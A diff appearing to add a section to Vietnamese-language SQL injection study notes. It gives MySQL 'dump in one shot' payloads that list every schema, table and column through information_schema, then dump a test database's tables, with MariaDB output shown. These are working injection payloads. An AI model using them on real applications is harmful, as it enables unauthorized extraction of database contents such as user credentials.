@@ -785,4 +785,85 @@
     ERROR 1105 (HY000): XPATH syntax error: ':~Menu 6~'
     ```
 
+### 10. Mysql DIOS - Dump in One Shot
+
+- Payload:
+
+  ```mysql
+  (select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and(@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)
+  ```
+
+  ```mysql
+   [ performance_schema ] > threads > PROCESSLIST_COMMAND|
+   [ performance_schema ] > threads > PROCESSLIST_TIME|
+   [ performance_schema ] > threads > PROCESSLIST_STATE|
+   [ performance_schema ] > threads > PROCESSLIST_INFO|
+   [ performance_schema ] > threads > PARENT_THREAD_ID|
+   [ performance_schema ] > threads > ROLE|
+   [ performance_schema ] > threads > INSTRUMENTED|
+   [ performance_schema ] > users > USER|
+   [ performance_schema ] > users > CURRENT_CONNECTIONS|
+   [ performance_schema ] > users > TOTAL_CONNECTIONS|
+   [ xssuser ] > menu > ID|
+   [ xssuser ] > menu > NAME_MENU|
+   [ xssuser ] > user > ID|
+   [ xssuser ] > user > USER|
+   [ xssuser ] > user > PASS|
+   [ xssuser ] > user > USERID|
+   [ xssuser ] > user > LEVEL| |
+  +-----------------------------------------------------------------------------------------------------------------------------------------------------
+  ```
+
+- Tuy nhiên nếu dùng cách này thì có khá nhiều dư thừa không cần thiết, ta sẽ lọc bớt bằng cách thêm câu sau `table_schema in ('xssuser')` với điều kiện phải biết trước tên *database*
+
+  - Payload:
+
+    ```mysql
+    (select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and table_schema in ('xssuser') and(@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> (select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and table_schema in ('xssuser') and(@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a);
+    +------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+    | (@)                                                                                                                                                                                                              |
+    +------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+    |  
+     [ xssuser ] > menu > ID|
+     [ xssuser ] > menu > NAME_MENU|
+     [ xssuser ] > user > ID|
+     [ xssuser ] > user > USER|
+     [ xssuser ] > user > PASS|
+     [ xssuser ] > user > USERID|
+     [ xssuser ] > user > LEVEL| |
+    +------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+    1 row in set (0.00 sec)
+    
+    ```
+
+- Từ *payload* trên ta đã có thể lấy ra tên *table*, *database* và *column*, giờ ta dùng payload sau để *dump data* ra
+
+  - Payload:
+
+    ```mysql
+    (select (@) from (select(@:=0x00),(select (@) from (xssuser.menu) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',ID,' ] > ',NAME_MENU,' > ',0x7C))))a)
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> (select (@) from (select(@:=0x00),(select (@) from (xssuser.menu) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',ID,' ] > ',NAME_MENU,' > ',0x7C))))a);
+    +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+    | (@)                                                                                                                                                                            |
+    +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+    |  
+    | [ 1 ] > Menu 2 > |
+    | [ 2 ] > Menu 4 > |
+    | [ 3 ] > Menu 5 > |
+    | [ 4 ] > Menu 6 > |
+    | [ 5 ] > Menu 7 > |
+    | [ 6 ] > Menu 8 > |
+    | [ 7 ] > asdf > |
+    | [ 8 ] > kaito > | |
+    +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+    1 row in set (0.01 sec)
+    ```
+
 - To be continue
